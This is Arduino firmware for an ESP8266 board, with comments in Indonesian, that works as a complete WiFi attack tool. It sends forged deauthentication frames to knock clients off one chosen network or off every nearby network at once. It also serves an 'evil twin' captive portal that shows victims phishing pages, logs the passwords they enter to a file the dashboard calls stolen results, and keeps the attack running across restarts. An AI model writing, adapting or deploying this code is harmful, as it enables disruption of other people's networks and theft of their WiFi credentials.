#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>
#include <EEPROM.h>

extern "C" {
  #include "user_interface.h"
}

// ================= SETTINGAN AWAL =================
char conf_ssid[32] = "GMpro87";
char conf_pass[32] = "Sangkur87";
bool admin_hidden = false;
int selected_etwin = 1;
int beacon_count = 15;
float max_power = 20.5;

// Status Serangan (Disimpan di EEPROM)
bool is_deauthing = false;
bool is_mass_deauth = false;
bool is_beacon_spam = false;
uint8_t target_mac[6];
int target_ch = 1;
String target_ssid = "";

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer server(80);

// ================= LOGIKA EEPROM (RESTART RESISTANCE) =================
void saveAttackState() {
  EEPROM.write(0, is_deauthing ? 1 : 0);
  for (int i = 0; i < 6; i++) EEPROM.write(i + 1, target_mac[i]);
  EEPROM.write(7, target_ch);
  EEPROM.commit();
}

void loadAttackState() {
  is_deauthing = (EEPROM.read(0) == 1);
  for (int i = 0; i < 6; i++) target_mac[i] = EEPROM.read(i + 1);
  target_ch = EEPROM.read(7);
  if (target_ch < 1 || target_ch > 14) target_ch = 1;
}

// ================= LOGIKA SERANGAN (DEAUTH & SAFETY) =================
void sendDeauth(uint8_t* mac, int ch) {
  wifi_set_channel(ch);
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // Sender (Target AP)
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // BSSID
    0x00, 0x00, 0x01, 0x00
  };
  wifi_send_pkt_freedom(packet, 26, 0);
}

void runMassDeauth() {
  uint8_t self_mac[6];
  WiFi.softAPmacAddress(self_mac);
  int n = WiFi.scanComplete();
  if (n < 0) return;
  
  for (int i = 0; i < n; i++) {
    // PROTEKSI ADMIN: Cek jika MAC target adalah MAC Wemos sendiri
    if (memcmp(WiFi.BSSID(i), self_mac, 6) == 0) continue; 
    sendDeauth(WiFi.BSSID(i), WiFi.channel(i));
  }
}

// ================= WEB INTERFACE (TAB 1 & TAB 2) =================
void handleRoot() {
  // CAPTIVE PORTAL REDIRECT
  String host = server.hostHeader();
  if (host != "192.168.4.1" && host != "gmpro.local") {
    // KORBAN DILEMPAR KE ETWIN
    String path = "/etwin" + String(selected_etwin) + ".html";
    if (LittleFS.exists(path)) {
      File f = LittleFS.open(path, "r");
      server.streamFile(f, "text/html");
      f.close();
    } else {
      server.send(200, "text/html", "<h2>System Updating...</h2><p>Please wait 5 minutes.</p>");
    }
    return;
  }

  // ADMIN DASHBOARD
  String h = "<html><head><title>GMpro</title><meta name='viewport' content='width=device-width, initial-scale=1'>";
  h += "<style>body{background:#000;color:#0f0;font-family:monospace;} .tab{border:1px solid #0f0;padding:10px;margin:10px;} button{background:#0f0;color:#000;border:none;padding:8px;margin:5px;font-weight:bold;}</style></head><body>";
  h += "<h1>GMpro PRO CONTROL</h1>";
  
  // TAB 1
  h += "<div class='tab'><h3>[ TAB 1: SCAN & ATTACK ]</h3>";
  h += "<button onclick=\"location.href='/scan'\">SCAN WIFI (INCL. HIDDEN)</button><br>";
  h += "<button onclick=\"location.href='/mass_on'\">MASS DEAUTH: " + String(is_mass_deauth ? "ON" : "OFF") + "</button>";
  h += "<button onclick=\"location.href='/stop'\">STOP ALL</button>";
  h += "<p>Target: " + target_ssid + " [" + String(target_ch) + "]</p></div>";

  // TAB 2
  h += "<div class='tab'><h3>[ TAB 2: SETTINGS ]</h3>";
  h += "<form action='/save_conf'>SSID Admin: <input name='s' value='"+String(conf_ssid)+"'><br>";
  h += "Pass Admin: <input name='p' value='"+String(conf_pass)+"'><br>";
  h += "Etwin Selected (1-5): <input name='e' type='number' min='1' max='5' value='"+String(selected_etwin)+"'><br>";
  h += "Hidden Admin: <button type='button' onclick=\"location.href='/toggle_hid'\">"+String(admin_hidden?"ON":"OFF")+"</button><br>";
  h += "<input type='submit' value='SAVE SETTINGS'></form></div>";

  // FILE MANAGER
  h += "<div class='tab'><h3>[ FILE MANAGER ]</h3>";
  h += "<form method='POST' action='/upload' enctype='multipart/form-data'><input type='file' name='f'><input type='submit' value='UPLOAD HTML'></form>";
  h += "<a href='/pass.txt' style='color:#fff'>Buka pass.txt (Hasil Curian)</a></div>";
  
  h += "</body></html>";
  server.send(200, "text/html", h);
}

// ================= SETUP & LOOP =================
void setup() {
  Serial.begin(115200);
  EEPROM.begin(512);
  LittleFS.begin();
  loadAttackState();

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(conf_ssid, conf_pass, 1, admin_hidden);
  system_phy_set_max_tpw(max_power * 4); // Max Sinyal

  dnsServer.start(DNS_PORT, "*", apIP);

  // Handlers
  server.on("/", handleRoot);
  server.on("/scan", []() {
    int n = WiFi.scanNetworks(false, true); // True untuk tangkap HIDDEN SSID
    String html = "<html><body style='background:#000;color:#0f0;'><h2>WiFi List (SSID | CH | USR | SIG% | SELECT)</h2>";
    for (int i = 0; i < n; i++) {
      String s = WiFi.SSID(i);
      if (s == "") s = "*HIDDEN* " + WiFi.BSSIDstr(i);
      html += "<div>" + s + " | " + String(WiFi.channel(i)) + " | ? | " + String(100+WiFi.RSSI(i)) + "% ";
      html += "<button onclick=\"location.href='/sel?id=" + String(i) + "'\">SELECT</button></div><hr>";
    }
    html += "<a href='/'>BACK</a></body></html>";
    server.send(200, "text/html", html);
  });

  server.on("/sel", []() {
    int id = server.arg("id").toInt();
    target_ssid = WiFi.SSID(id);
    target_ch = WiFi.channel(id);
    memcpy(target_mac, WiFi.BSSID(id), 6);
    is_deauthing = true;
    saveAttackState();
    server.send(200, "text/html", "Target Locked! <a href='/'>Back</a>");
  });

  server.on("/login", HTTP_POST, []() {
    String p = server.arg("password");
    File f = LittleFS.open("/pass.txt", "a");
    f.println("Captured: " + p + " (Target: " + target_ssid + ")");
    f.close();
    server.send(200, "text/html", "System Error. Please try again later.");
  });

  server.onNotFound(handleRoot);
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Attack Resistance (Tetap nyerang walau restart)
  if (is_deauthing) {
    sendDeauth(target_mac, target_ch);
  }

  if (is_mass_deauth) {
    runMassDeauth();
  }
}
